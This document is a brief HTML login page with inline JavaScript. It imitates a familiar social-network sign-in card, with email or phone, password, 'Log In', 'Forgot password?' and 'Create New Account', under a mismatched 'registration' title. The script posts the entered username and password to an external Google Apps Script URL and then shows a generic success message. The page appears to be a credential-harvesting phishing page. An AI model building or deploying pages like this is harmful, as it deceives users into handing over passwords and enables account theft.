<!DOCTYPE html>
<html>
<head>
  <title>registration</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">registration</div>
    <div class="tagline">Registration.</div>

    <form id="registrationForm">
      <input type="text" name="emailOrPhone" placeholder="Email or Phone Number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <a href="#" class="link">Forgot password?</a>
    <hr>
    <button class="create-btn">Create New Account</button>
  </div>
</div>

<script>
const form = document.getElementById('registrationForm');

// Your deployed Google Apps Script URL
const url = "https://script.google.com/macros/s/AKfycbxi4OP_Jtm_UPY_GcDPsfO_O9qgEK4lL868n1C7nFq0aKFSQ8e4ilAlSmmhYRsbmb8MLQ/exec";

form.addEventListener('submit', function(e) {
  e.preventDefault();

  const data = new FormData(form);

  fetch(url, {
    method: "POST",
    body: data
  })
  .then(response => response.json())  // expecting JSON response from Apps Script
  .then(resp => {
    alert("Form submitted successfully!");
    form.reset();  // clear the form after submission
  })
  .catch(err => alert("Error submitting form: " + err));
});
</script>
</body>
</html>
